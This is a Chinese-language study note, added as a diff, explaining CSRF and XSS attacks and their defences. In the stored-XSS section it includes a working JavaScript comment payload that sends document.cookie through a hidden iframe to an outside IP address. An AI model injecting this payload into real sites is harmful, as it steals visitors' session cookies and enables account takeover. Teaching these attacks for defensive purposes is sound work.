@@ -1,0 +1,71 @@
+1.csrf
+（1）登录受信任网站A，并在本地生成Cookie。（如果用户没有登录网站A，那么网站B在诱导的时候，请求网站A的api接口时，
+会提示你登录）
+（2）在不登出A的情况下，访问危险网站B（其实是利用了网站A的漏洞）。
+（3）网站B发出一个请求，要求用户访问A网站
+（4）浏览器访问A网站
+（6）A服务器不知道该请求是B发出的，但因为用户已经登录，因为会携带用户的cookie，所以会任务是用户发出的请求。
+这样B就达到了模拟用户A发出的请求。
+
+2.CSRF如何防御
+
+方法一、Token 验证：（用的最多）
+
+（1）服务器发送给客户端一个token；
+
+（2）客户端提交的表单中带着这个token。
+
+（3）如果这个 token 不合法，那么服务器拒绝这个请求。
+
+方法二：隐藏令牌：
+
+把 token 隐藏在 http 的 head头中。
+
+方法二和方法一有点像，本质上没有太大区别，只是使用方式上有区别。
+
+方法三、Referer 验证：
+
+Referer 指的是页面请求来源。意思是，只接受本站的请求，服务器才做响应；如果不是，就拦截。
+
+3.xss
+XSS (Cross Site Scripting)，即跨站脚本攻击，是一种常见于 Web 应用中的计算机安全漏洞。
+恶意攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，
+进而达到攻击者的目的。比如获取用户的 Cookie、导航到恶意网站、携带木马等。借助安全圈里面非常有名的一句话：
+
+所有的输入都是有害的。
+这句话把 XSS 漏洞的本质体现的淋漓尽致。大部分的 XSS 漏洞都是由于没有处理好用户的输入，
+导致恶意脚本在浏览器中执行。任何输入提交数据的地方都有可能存在 XSS。 
+
+类型
+反射型
+用户在页面输入框中输入数据，通过 get 或者 post 方法向服务器端传递数据，输入的数据一般是放在 URL 的 query string 中，或者是 form 表单中，如果服务端没有对这些数据进行过滤、验证或者编码，直接将用户输入的数据呈现出来，就可能会造成反射型 XSS。反射型 XSS 是非常普遍的，其危害程度通常较小，但是某些反射型 XSS 还是会造成严重后果的。 
+黑客通常通过构造一个包含 XSS 代码的 URL，诱导用户点击链接，触发 XSS 代码，达到劫持访问、获取 cookies 的目的。
+
+持久型
+通常是因为服务器端将用户输入的恶意脚本没有经过验证就存储在数据库中，并且通过调用数据库的方式，将数据呈现在浏览器上，当页面被用户打开的时候执行，每当用户打开浏览器，恶意脚本就会执行。持久型的 XSS 攻击相比非持久型的危害性更大，因为每当用户打开页面，恶意脚本都会执行。 
+例如一个评论功能，在提交评论的表单里面：
+
+例子：通过隐藏的iframe，将该代码提交到评论中，每次用户加载该评论，就能将用户相关cookie发送到对应的服务器。
+// 用 <script type="text/javascript"></script> 包起来放在评论中
+(function(window, document) {
+    // 构造泄露信息用的 URL
+    var cookies = document.cookie;
+    var xssURIBase = "http://192.168.123.123/myxss/";
+    var xssURI = xssURIBase + window.encodeURI(cookies);
+    // 建立隐藏 iframe 用于通讯
+    var hideFrame = document.createElement("iframe");
+    hideFrame.height = 0;
+    hideFrame.width = 0;
+    hideFrame.style.display = "none";
+    hideFrame.src = xssURI;
+    // 开工
+    document.body.appendChild(hideFrame);
+})(window, document);
+
+防范：
+1、编码：对用户输入的数据进行HTML Entity编码。
+2.过滤：
+  移除用户输入的和事件相关的属性。如onerror可以自动触发攻击，还有onclick等。（总而言是，过滤掉一些不安全的内容）
+  移除用户输入的Style节点、Script节点、Iframe节点。（尤其是Script节点，它可是支持跨域的呀，一定要移除）。
+3.避免直接对HTML Entity进行解码
+
